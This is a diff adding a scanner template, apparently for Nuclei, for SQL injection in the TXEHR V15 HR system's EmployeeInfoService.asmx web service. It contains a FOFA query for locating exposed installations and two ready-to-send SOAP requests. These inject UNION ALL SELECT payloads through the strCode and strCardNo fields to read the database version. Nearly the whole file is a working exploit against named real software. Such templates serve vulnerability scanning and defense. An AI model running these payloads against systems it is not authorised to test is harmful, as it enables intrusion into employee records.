@@ -1,0 +1,56 @@
+id: tongxiangHR-TXEHR_V15_EmployeeInfoService-sql
+
+info:
+  name: 同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+
+  tags: SQL Injection
+  
+http:
+  - raw:
+      - |
+        POST /Service/EmployeeInfoService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetEmployeeByCode"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+          <GetEmployeeByCode xmlns="http://tempuri.org/">
+           <strCode>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCode>
+          </GetEmployeeByCode>
+         </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /Service/EmployeeInfoService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetEmployeeByCardNo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+          <GetEmployeeByCardNo xmlns="http://tempuri.org/">
+           <strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
+          </GetEmployeeByCardNo>
+         </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
